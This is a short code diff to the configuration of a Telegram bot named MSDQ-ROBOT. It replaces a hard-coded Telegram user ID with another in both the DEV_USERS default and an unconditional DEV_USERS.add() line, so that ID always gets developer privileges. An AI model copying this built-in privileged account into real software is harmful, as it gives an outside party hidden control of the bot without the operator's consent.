@@ -48,7 +48,7 @@ if ENV:
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
 
     try:
-        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "1825139822").split()}
+        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "5779185981").split()}
     except ValueError as exc:
         raise Exception(
             "[MSDQ-ROBOT] dev users list tidak cocok"
@@ -194,7 +194,7 @@ else:
 
 # Count owner as dev users
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1825139822)
+DEV_USERS.add(5779185981)
 
 
 # Pass if SpamWatch token not set.
